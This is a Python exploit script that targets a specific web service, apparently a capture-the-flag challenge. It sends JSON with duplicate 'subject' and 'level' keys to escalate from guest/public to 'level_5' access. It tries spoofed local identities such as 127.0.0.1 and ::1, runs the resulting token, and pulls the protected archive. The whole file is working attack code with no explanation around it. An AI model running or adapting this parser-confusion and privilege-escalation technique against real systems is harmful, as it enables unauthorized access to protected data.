import urllib.request
import json
import time

BASE_URL = "https://kotoamatsukami-zcgb4f64hq-el.a.run.app"

def test_subject(subject):
    # Construct duplicate key payload
    parts = [
        f'"action": "request_access"',
        f'"subject": "guest"',
        f'"level": "public"',
        f'"subject": "{subject}"',
        f'"level": "level_5"'
    ]
    payload_str = "{" + ", ".join(parts) + "}"
    
    # 1. Seal
    req = urllib.request.Request(
        f"{BASE_URL}/api/seal",
        data=payload_str.encode('utf-8'),
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    try:
        with urllib.request.urlopen(req) as response:
            res_data = json.loads(response.read().decode('utf-8'))
            token = res_data.get("token")
    except Exception as e:
        return f"Seal FAILED: {e}"

    # 2. Execute
    execute_payload = json.dumps({"token": token})
    req = urllib.request.Request(
        f"{BASE_URL}/api/execute",
        data=execute_payload.encode('utf-8'),
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    try:
        with urllib.request.urlopen(req) as response:
            res_data = json.loads(response.read().decode('utf-8'))
            msg = res_data.get("message")
            dec_view = res_data.get("decision_view")
    except Exception as e:
        return f"Execute FAILED: {e}"

    # 3. Archive
    req_arc = urllib.request.Request(f"{BASE_URL}/api/archive")
    try:
        with urllib.request.urlopen(req_arc) as response:
            archive_data = response.read().decode('utf-8')
            return f"SUCCESS: {archive_data}"
    except urllib.error.HTTPError as e:
        return f"Msg: {msg} | Dec View: {dec_view} | Archive FAILED: {e.code}"

# Test local subjects
subjects = ["127.0.0.1", "localhost", "::1", "::ffff:127.0.0.1", "unix", "internal"]
for subj in subjects:
    res = test_subject(subj)
    if "without authorization changes" not in res:
        print(f"[!] SUCCESS or DIFFERENT RESPONSE for subject '{subj}': {res}")
    else:
        print(f"Failed for subject '{subj}': {res}")
    time.sleep(0.1)
